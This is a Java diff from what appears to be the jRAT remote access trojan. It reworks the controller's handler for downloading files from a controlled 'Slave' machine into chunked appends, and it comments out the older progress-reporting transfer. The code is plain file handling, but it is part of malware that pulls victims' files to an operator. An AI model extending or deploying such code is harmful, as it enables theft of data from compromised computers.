@@ -2,6 +2,7 @@ package se.jrat.client.packets.incoming;
 
 import java.io.DataInputStream;
 import java.io.File;
+import java.io.FileOutputStream;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -16,14 +17,13 @@ import se.jrat.common.io.FileIO;
 import se.jrat.common.io.TransferListener;
 
 
-public class Packet29ServerDownloadFile extends AbstractIncomingPacket {
+public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
 
 	public static final Map<Slave, FileData> data = new HashMap<Slave, FileData>();
 
 	@Override
 	public void read(final Slave slave, DataInputStream dis) throws Exception {
-		String rfile = slave.readLine();
-		final String remoteFile = slave.readLine();
+		final String remotePath = slave.readLine();
 
 		final FrameFileTransfer frame = FrameFileTransfer.instance;
 		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);
@@ -37,10 +37,16 @@ public class Packet29ServerDownloadFile extends AbstractIncomingPacket {
 		File output = localData.getLocalFile();
 
 		if (output.isDirectory()) {
-			output = new File(output, rfile);
+			output = new File(output, remotePath.substring(remotePath.lastIndexOf(slave.getFileSeparator()) + 1, remotePath.length()));
 		}
+		
+		byte[] buffer = new byte[dis.readInt()];
+		dis.readFully(buffer);
+		FileOutputStream fos = new FileOutputStream(output, true);
+		fos.write(buffer);
+		fos.close();
 
-		try {
+		/*try {
 			FileIO fileio = new FileIO();
 			fileio.readFile(output, slave.getSocket(), slave.getDataInputStream(), slave.getDataOutputStream(), new TransferListener() {
 				@Override
@@ -48,16 +54,16 @@ public class Packet29ServerDownloadFile extends AbstractIncomingPacket {
 					int progress = (int) ((float) bytesSent / (float) totalBytes * 100.0F);
 
 					if (frame != null) {
-						frame.reportProgress(remoteFile, progress, (int) bytesSent, (int) totalBytes);
+						frame.reportProgress(remotePath, progress, (int) bytesSent, (int) totalBytes);
 					}
 					if (frame2 != null) {
-						frame2.reportProgress(remoteFile, progress, (int) bytesSent, (int) totalBytes);
+						frame2.reportProgress(remotePath, progress, (int) bytesSent, (int) totalBytes);
 					}
 				}
 			}, slave.getKey());
 
 			if (frame != null) {
-				frame.done(remoteFile, output.length() + "");
+				frame.done(remotePath, output.length() + "");
 			}
 
 			if (frame2 != null) {
@@ -88,7 +94,7 @@ public class Packet29ServerDownloadFile extends AbstractIncomingPacket {
 			}.start();
 		} catch (Exception e) {
 			e.printStackTrace();
-		}
+		}*/
 	}
 
 }
